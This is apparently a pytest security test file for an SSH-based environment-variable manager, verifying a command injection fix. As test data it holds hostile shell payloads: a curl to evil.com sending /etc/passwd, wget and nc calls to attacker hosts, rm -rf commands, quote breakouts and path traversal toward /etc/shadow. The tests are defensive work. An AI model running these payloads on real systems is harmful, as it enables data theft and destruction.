"""Security tests for env_manager module.

Tests for SEC-002: Command Injection vulnerability fix.
Covers 5 specific attack vectors to ensure SSH stdin redirection approach
eliminates command injection vulnerabilities.
"""

import base64
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from azlin.env_manager import EnvManager, EnvManagerError
from azlin.modules.ssh_connector import SSHConfig


class TestEnvManagerSecurity:
    """Security tests for EnvManager class."""

    @pytest.fixture
    def ssh_config(self, tmp_path):
        """Create mock SSH config with valid key path."""
        # Create a dummy SSH key file
        key_path = tmp_path / "id_rsa"
        key_path.write_text("dummy key content")
        return SSHConfig(host="20.1.2.3", user="azureuser", key_path=key_path)

    @pytest.fixture
    def sample_bashrc_content(self):
        """Sample bashrc content without azlin env vars."""
        return """# ~/.bashrc

# User configuration
export PATH=$HOME/bin:$PATH
alias ll='ls -la'

# End of file
"""

    # Attack Vector 1: Command injection via backticks
    def test_command_injection_backticks_blocked(self, ssh_config, sample_bashrc_content):
        """Test that backtick command injection is blocked."""
        malicious_value = "`curl http://evil.com/steal?data=$(cat /etc/passwd)`"

        with patch("subprocess.run") as mock_run:
            # Mock the read operation
            mock_run.return_value = MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")

            # Set up side effects for read and write
            def run_side_effect(*args, **kwargs):
                if "python3" in args[0]:
                    # Check if this is read or write operation
                    input_script = kwargs.get("input", "")
                    if "bashrc_path.read_text()" in input_script:
                        # Read operation
                        return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                    if "base64.b64decode" in input_script:
                        # Write operation - verify malicious content is base64-encoded
                        # Extract the encoded content from the script
                        assert 'encoded_content = "' in input_script
                        # Verify that backticks are encoded and not executed
                        # The malicious value should be in the base64-encoded string
                        return MagicMock(returncode=0, stdout="OK\n", stderr="")
                return MagicMock(returncode=1, stdout="", stderr="error")

            mock_run.side_effect = run_side_effect

            # This should succeed without executing the backtick command
            result = EnvManager.set_env_var(ssh_config, "MALICIOUS_VAR", malicious_value)

            assert result is True
            # Verify subprocess.run was called with proper SSH args
            assert mock_run.call_count >= 2  # At least read and write

    # Attack Vector 2: Command injection via $(command)
    def test_command_injection_dollar_paren_blocked(self, ssh_config, sample_bashrc_content):
        """Test that $(command) injection is blocked."""
        malicious_value = "$(rm -rf /tmp/test)"

        with patch("subprocess.run") as mock_run:

            def run_side_effect(*args, **kwargs):
                if "python3" in args[0]:
                    input_script = kwargs.get("input", "")
                    if "bashrc_path.read_text()" in input_script:
                        return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                    if "base64.b64decode" in input_script:
                        # Verify the malicious content is safely encoded
                        assert "$(rm -rf" not in args[0]  # Should not be in SSH args
                        return MagicMock(returncode=0, stdout="OK\n", stderr="")
                return MagicMock(returncode=1, stdout="", stderr="error")

            mock_run.side_effect = run_side_effect

            result = EnvManager.set_env_var(ssh_config, "MALICIOUS_VAR", malicious_value)

            assert result is True

    # Attack Vector 3: Shell metacharacter injection
    def test_command_injection_shell_metacharacters_blocked(
        self, ssh_config, sample_bashrc_content
    ):
        """Test that shell metacharacters are properly handled."""
        malicious_values = [
            "value; cat /etc/passwd",
            "value && rm -rf /",
            "value || wget http://evil.com/malware",
            "value | nc attacker.com 1234",
            "value > /tmp/exploit",
            "value\nrm -rf /",
        ]

        for malicious_value in malicious_values:
            with patch("subprocess.run") as mock_run:

                def run_side_effect(*args, **kwargs):
                    if "python3" in args[0]:
                        input_script = kwargs.get("input", "")
                        if "bashrc_path.read_text()" in input_script:
                            return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                        if "base64.b64decode" in input_script:
                            # Verify malicious characters are in base64, not in shell
                            for ssh_arg in args[0]:
                                # Ensure the malicious value is not in the SSH command itself
                                if isinstance(ssh_arg, str):
                                    assert "; cat /etc/passwd" not in ssh_arg
                                    assert "&& rm" not in ssh_arg
                                    assert "|| wget" not in ssh_arg
                                    assert "| nc" not in ssh_arg
                            return MagicMock(returncode=0, stdout="OK\n", stderr="")
                    return MagicMock(returncode=1, stdout="", stderr="error")

                mock_run.side_effect = run_side_effect

                result = EnvManager.set_env_var(ssh_config, "TEST_VAR", malicious_value)
                assert result is True

    # Attack Vector 4: Quote escaping attacks
    def test_command_injection_quote_escaping_blocked(self, ssh_config, sample_bashrc_content):
        """Test that quote escaping attacks are blocked."""
        malicious_values = [
            "value' && curl http://evil.com; echo '",
            'value" && rm -rf /tmp; echo "',
            "value'; $(malicious); echo '",
            "value`echo hacked`",
        ]

        for malicious_value in malicious_values:
            with patch("subprocess.run") as mock_run:

                def run_side_effect(*args, **kwargs):
                    if "python3" in args[0]:
                        input_script = kwargs.get("input", "")
                        if "bashrc_path.read_text()" in input_script:
                            return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                        if "base64.b64decode" in input_script:
                            # Quotes should be inside base64-encoded content, not breaking out
                            return MagicMock(returncode=0, stdout="OK\n", stderr="")
                    return MagicMock(returncode=1, stdout="", stderr="error")

                mock_run.side_effect = run_side_effect

                result = EnvManager.set_env_var(ssh_config, "TEST_VAR", malicious_value)
                assert result is True

    # Attack Vector 5: Path traversal and file overwrite
    def test_path_traversal_blocked(self, ssh_config):
        """Test that path traversal attempts are contained.

        The Python script uses Path.home() which cannot be manipulated
        via environment variable content.
        """
        # These values should be stored safely without affecting file paths
        malicious_values = [
            "../../etc/passwd",
            "../../../../../etc/shadow",
            "~/../../root/.ssh/authorized_keys",
        ]

        for malicious_value in malicious_values:
            with patch("subprocess.run") as mock_run:

                def run_side_effect(*args, **kwargs):
                    if "python3" in args[0]:
                        input_script = kwargs.get("input", "")
                        if "bashrc_path.read_text()" in input_script:
                            return MagicMock(returncode=0, stdout="", stderr="")
                        if "base64.b64decode" in input_script:
                            # The script hardcodes the path, so traversal in content is harmless
                            assert "home = Path.home()" in input_script
                            assert "temp_path = home / '.bashrc.tmp'" in input_script
                            return MagicMock(returncode=0, stdout="OK\n", stderr="")
                    return MagicMock(returncode=1, stdout="", stderr="error")

                mock_run.side_effect = run_side_effect

                result = EnvManager.set_env_var(ssh_config, "TEST_VAR", malicious_value)
                assert result is True

    # Test content size validation
    def test_content_size_limit_enforced(self, ssh_config):
        """Test that content size limits prevent DoS attacks."""
        # Create content exceeding MAX_CONTENT_SIZE
        large_content = "x" * (EnvManager.MAX_CONTENT_SIZE + 1)

        with patch("subprocess.run") as mock_run:
            # Mock read returning oversized content
            mock_run.return_value = MagicMock(returncode=0, stdout=large_content, stderr="")

            with pytest.raises(EnvManagerError) as exc_info:
                EnvManager._read_bashrc(ssh_config)

            assert "exceeds maximum" in str(exc_info.value)

    # Test value size validation
    def test_value_size_limit_enforced(self, ssh_config):
        """Test that value size limits prevent DoS attacks."""
        # Create value exceeding MAX_VALUE_SIZE
        large_value = "x" * (EnvManager.MAX_VALUE_SIZE + 1)

        with pytest.raises(EnvManagerError) as exc_info:
            EnvManager.set_env_var(ssh_config, "TEST_VAR", large_value)

        assert "exceeds maximum" in str(exc_info.value)

    # Test SSH config validation
    def test_ssh_config_validation_invalid_host(self, tmp_path):
        """Test that invalid SSH host is rejected."""
        key_path = tmp_path / "id_rsa"
        key_path.write_text("key")

        invalid_configs = [
            SSHConfig(host="", user="user", key_path=key_path),
            SSHConfig(host=None, user="user", key_path=key_path),
        ]

        for config in invalid_configs:
            with pytest.raises(EnvManagerError) as exc_info:
                EnvManager.set_env_var(config, "VAR", "value")

            assert "Invalid SSH host" in str(exc_info.value)

    def test_ssh_config_validation_invalid_user(self, tmp_path):
        """Test that invalid SSH user is rejected."""
        key_path = tmp_path / "id_rsa"
        key_path.write_text("key")

        invalid_configs = [
            SSHConfig(host="host", user="", key_path=key_path),
            SSHConfig(host="host", user=None, key_path=key_path),
        ]

        for config in invalid_configs:
            with pytest.raises(EnvManagerError) as exc_info:
                EnvManager.set_env_var(config, "VAR", "value")

            assert "Invalid SSH user" in str(exc_info.value)

    def test_ssh_config_validation_invalid_key_path(self, tmp_path):
        """Test that invalid SSH key path is rejected."""
        invalid_configs = [
            SSHConfig(host="host", user="user", key_path=Path("/nonexistent/key")),
            SSHConfig(host="host", user="user", key_path=None),
        ]

        for config in invalid_configs:
            with pytest.raises(EnvManagerError) as exc_info:
                EnvManager.set_env_var(config, "VAR", "value")

            assert "Invalid or missing SSH key path" in str(exc_info.value)

    # Test base64 encoding is used correctly
    def test_base64_encoding_used_for_content(self, ssh_config, sample_bashrc_content):
        """Test that content is base64-encoded in write operations."""
        test_value = "test_value_123"

        with patch("subprocess.run") as mock_run:

            def run_side_effect(*args, **kwargs):
                if "python3" in args[0]:
                    input_script = kwargs.get("input", "")
                    if "bashrc_path.read_text()" in input_script:
                        return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                    if "base64.b64decode" in input_script:
                        # Verify base64 encoding is used
                        assert 'encoded_content = "' in input_script
                        assert "base64.b64decode(encoded_content)" in input_script
                        # Verify the encoded string is valid base64
                        # Extract encoded_content value
                        import re

                        match = re.search(r'encoded_content = "([A-Za-z0-9+/=]+)"', input_script)
                        if match:
                            encoded = match.group(1)
                            # Verify it's valid base64
                            try:
                                base64.b64decode(encoded)
                            except Exception:
                                pytest.fail("Invalid base64 encoding in script")
                        return MagicMock(returncode=0, stdout="OK\n", stderr="")
                return MagicMock(returncode=1, stdout="", stderr="error")

            mock_run.side_effect = run_side_effect

            result = EnvManager.set_env_var(ssh_config, "TEST_VAR", test_value)
            assert result is True

    # Test that subprocess args are constructed correctly
    def test_subprocess_args_no_shell_true(self, ssh_config, sample_bashrc_content):
        """Test that subprocess is called with shell=False (default).

        This ensures commands cannot be interpreted by shell.
        """
        with patch("subprocess.run") as mock_run:

            def run_side_effect(*args, **kwargs):
                # Verify shell is not True
                assert kwargs.get("shell", False) is False
                # Verify args are passed as list, not string
                assert isinstance(args[0], list)
                if "python3" in args[0]:
                    input_script = kwargs.get("input", "")
                    if "bashrc_path.read_text()" in input_script:
                        return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                    if "base64.b64decode" in input_script:
                        return MagicMock(returncode=0, stdout="OK\n", stderr="")
                return MagicMock(returncode=1, stdout="", stderr="error")

            mock_run.side_effect = run_side_effect

            result = EnvManager.set_env_var(ssh_config, "TEST_VAR", "value")
            assert result is True

    # Test timeout enforcement
    def test_timeout_enforced(self, ssh_config):
        """Test that SSH operations timeout appropriately."""
        with patch("subprocess.run") as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("ssh", 30)

            with pytest.raises(EnvManagerError) as exc_info:
                EnvManager._read_bashrc(ssh_config)

            assert "timed out" in str(exc_info.value).lower()

    # Test SSH command construction
    def test_ssh_command_construction_secure(self, ssh_config, sample_bashrc_content):
        """Test that SSH command is constructed with security options."""
        with patch("subprocess.run") as mock_run:

            def run_side_effect(*args, **kwargs):
                ssh_cmd = args[0]
                # Verify security options are present
                assert "-o" in ssh_cmd
                assert "BatchMode=yes" in ssh_cmd
                assert "ConnectTimeout=30" in ssh_cmd
                # Verify key-based auth
                assert "-i" in ssh_cmd
                assert str(ssh_config.key_path) in ssh_cmd
                # Verify python3 is the command (not a shell)
                assert "python3" in ssh_cmd
                # Verify no direct command strings
                assert "cat" not in ssh_cmd
                assert "printf" not in ssh_cmd
                assert "echo" not in ssh_cmd

                if "python3" in ssh_cmd:
                    input_script = kwargs.get("input", "")
                    if "bashrc_path.read_text()" in input_script:
                        return MagicMock(returncode=0, stdout=sample_bashrc_content, stderr="")
                    if "base64.b64decode" in input_script:
                        return MagicMock(returncode=0, stdout="OK\n", stderr="")
                return MagicMock(returncode=1, stdout="", stderr="error")

            mock_run.side_effect = run_side_effect

            EnvManager._read_bashrc(ssh_config)
            # Verify command was called
            assert mock_run.called
